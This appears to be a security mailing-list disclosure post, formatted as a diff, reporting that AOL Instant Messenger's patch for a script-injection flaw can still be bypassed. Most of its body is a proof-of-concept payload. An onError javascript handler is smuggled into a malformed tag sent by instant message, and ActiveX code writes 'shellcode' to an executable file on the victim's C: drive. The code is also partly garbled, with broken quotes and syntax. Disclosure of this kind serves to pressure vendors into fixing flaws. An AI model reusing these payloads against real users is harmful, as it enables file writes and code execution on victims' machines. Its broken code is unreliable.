@@ -1,0 +1,30 @@
+Sorry for the brief post but Im still able to bypass filters that aol has
+put in place.  So again with frustration I came to Full Disclosure to imply pressure on a
+company to patch correctly.  From reading feedback from AOL they feel the
+vulnerability is put to bed and requires no more attention, after the patch, I already disagree unfortunately.
+
+I am not posting 0day PoC only currently patched examples.
+
+
+You will need to send the following over an open source instant messanger manually
+
+var jshellcode;
+jsshellcode; = "var fso = new ActiveXObject("Scripting.FileSystemObject");var fh = fso.OpenTextFile("c:\\binary.exe", 8);var shellcode = "/x0";fh.WriteLine(shellcode);fh.Close(); ";
+//you can also use the ADO XML download exe vulnarability from my other project in write.txt just converted to javascript
+
+SendIM("<dd scml=" + Chr(34) + "........" + Chr(34) + "> " + Chr(34) & "onError=" + Chr(34) + "javascript:" + js & Chr(34) + ">");
+
+
+
+
+
+references
+http://www.wired.com/politics/security/news/2007/12/aim_hack
+
+http://www.pronetworks.org/index.php/software-and-betas-news/847#comment-199
+
+http://talkback.zdnet.com/5208-12691-0.html?forumID=1&threadID=41986&messageID=785355&start=-1
+
+
+
+Michael Evanchik
